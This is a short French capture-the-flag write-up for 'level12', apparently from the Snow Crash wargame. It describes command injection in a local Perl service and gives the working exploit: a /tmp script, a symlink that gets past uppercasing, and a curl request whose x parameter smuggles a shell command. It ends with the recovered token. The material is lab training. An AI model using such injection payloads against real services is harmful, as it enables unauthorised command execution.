# level12

1. Fichiers trouvés avec `ls` :

```bash
level12.pl
```

2. Analyse du script `level12.pl`

* Le service écoute `127.0.0.1:4646` et traite les paramètres GET `x` et `y`.
* Le script utilise une substitution de commande avec `@output = grep /$x/, @output;` où `$x` est directement inséré dans la commande.
* Problème : la variable `$x` est **concatenée** directement dans une commande shell → **injection shell possible**.


3. Vulnérabilité & objectif

* Le processus s'exécute avec les droits de `flag12` → l'objectif est d'exécuter `/bin/getflag` côté serveur et d'écrire la sortie dans un fichier lisible par l'utilisateur.


4. Exploitation

```bash
# Créer un script malveillant
echo "/bin/getflag > /tmp/token" > /tmp/script.sh
chmod 777 /tmp/script.sh

# Créer un lien symbolique pour contourner les restrictions liées à la mise en uppercase
ln -s /tmp/script.sh /tmp/HACK

# Exploiter l'injection via curl
curl -Gs 'http://127.0.0.1:4646/' \
  --data-urlencode 'x=";/*/HACK;#' \
  --data-urlencode 'y='

# Récupérer le token créé
cat /tmp/token
```

5. Token découvert

Le token est `g1qKMiRpXf53AWhDaU7FEkczr`
